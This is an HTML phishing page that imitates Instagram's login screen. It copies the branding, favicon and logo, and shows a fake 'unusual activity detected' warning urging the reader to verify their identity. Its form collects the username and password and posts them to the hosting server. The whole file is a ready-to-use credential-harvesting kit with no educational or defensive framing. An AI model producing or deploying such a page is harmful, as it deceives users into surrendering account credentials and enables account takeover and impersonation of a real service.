<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram • Secure your account</title>
<link rel="icon" href="https://www.instagram.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    width: 100%;
    max-width: 400px;
    padding: 40px 32px 24px;
    text-align: center;
  }
  .logo {
    width: 64px; height: 64px; margin: 0 auto 20px;
    background: linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
  }
  .logo svg { width: 36px; height: 36px; }
  .title {
    font-size: 15px; color: #262626; font-weight: 600;
    line-height: 1.4; margin-bottom: 24px;
  }
  .field { position: relative; margin-bottom: 8px; }
  .field input {
    width: 100%;
    padding: 14px 12px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 6px;
    font-size: 14px;
    color: #262626;
    outline: none;
  }
  .field input:focus { border-color: #a8a8a8; background: #fff; }
  .field label {
    position: absolute; left: 12px; top: 12px;
    font-size: 12px; color: #8e8e8e;
    pointer-events: none;
    transition: all .15s;
  }
  .field input:focus + label,
  .field input:not(:placeholder-shown) + label {
    top: 4px; font-size: 10px;
  }
  .btn {
    width: 100%;
    padding: 12px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-weight: 600;
    font-size: 14px;
    margin-top: 12px;
    cursor: pointer;
  }
  .btn:active { background: #1877f2; }
  .divider {
    display: flex; align-items: center; gap: 16px;
    margin: 20px 0; color: #8e8e8e; font-size: 12px;
  }
  .divider::before, .divider::after {
    content: ""; flex: 1; height: 1px; background: #dbdbdb;
  }
  .footer {
    font-size: 12px; color: #8e8e8e; margin-top: 18px; line-height: 1.5;
  }
  .warning {
    background: #fff4e5;
    border: 1px solid #ffd79a;
    color: #8a5a00;
    padding: 10px 12px;
    border-radius: 6px;
    font-size: 12px;
    margin-bottom: 20px;
    text-align: left;
    line-height: 1.5;
  }
</style>
</head>
<body>
<form class="card" method="POST" action="">
  <div class="logo">
    <!-- Clean, geometric Instagram SVG -->
    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="2" y="2" width="20" height="20" rx="5" stroke="#ffffff" stroke-width="2"/>
      <circle cx="12" cy="12" r="4.5" stroke="#ffffff" stroke-width="2"/>
      <circle cx="17.5" cy="6.5" r="1.2" fill="#ffffff"/>
    </svg>
  </div>
  <div class="warning">⚠️ Unusual activity detected. Verify your identity to keep your account secure.</div>
  <div class="title">Secure your Instagram account via verification</div>
  
  <div class="field">
    <input type="text" name="username" id="username" placeholder=" " required autocomplete="off">
    <label for="username">Username, Email, Mobile number</label>
  </div>
  
  <div class="field">
    <input type="password" name="password" id="password" placeholder=" " required>
    <label for="password">Password</label>
  </div>
  
  <button type="submit" class="btn">Log In</button>
  <div class="divider">OR</div>
  <div class="footer">By continuing, you agree to Instagram's Terms and Privacy Policy.</div>
</form>
</body>
</html>
